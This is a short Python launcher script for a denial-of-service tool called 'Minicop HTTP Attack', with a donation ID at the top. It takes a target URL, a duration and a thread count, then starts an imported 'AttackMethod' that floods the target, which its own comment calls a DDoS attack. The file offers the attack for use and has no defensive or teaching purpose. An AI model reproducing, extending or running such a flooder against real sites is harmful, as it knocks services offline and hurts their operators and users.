# Donate:
#   Payeer: P1061248421
import os
import sys
import argparse

# Go to current directory
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Error import modules", err)
    sys.exit(1)

# Analisa args
parser = argparse.ArgumentParser(description="Minicop HTTP Attack")
parser.add_argument(
    "--target",
    type=str,
    metavar="<URL>",
    help="Target URL",
)
parser.add_argument(
    "--time", type=int, default=180, metavar="<time>", help="time in seconds"
)
parser.add_argument(
    "--threads", type=int, default=120, metavar="<threads>", help="thread count (1-200)"
)

# Obtem args
args = parser.parse_args()
threads = args.threads
time = args.time
target = args.target


if __name__ == "__main__":
    # Print help
    if not target or not time:
        parser.print_help()
        sys.exit(1)

    # Executa ataque DDOS
    with AttackMethod(
        duration=time, threads=threads, target=target
    ) as Flood:
        Flood.Start()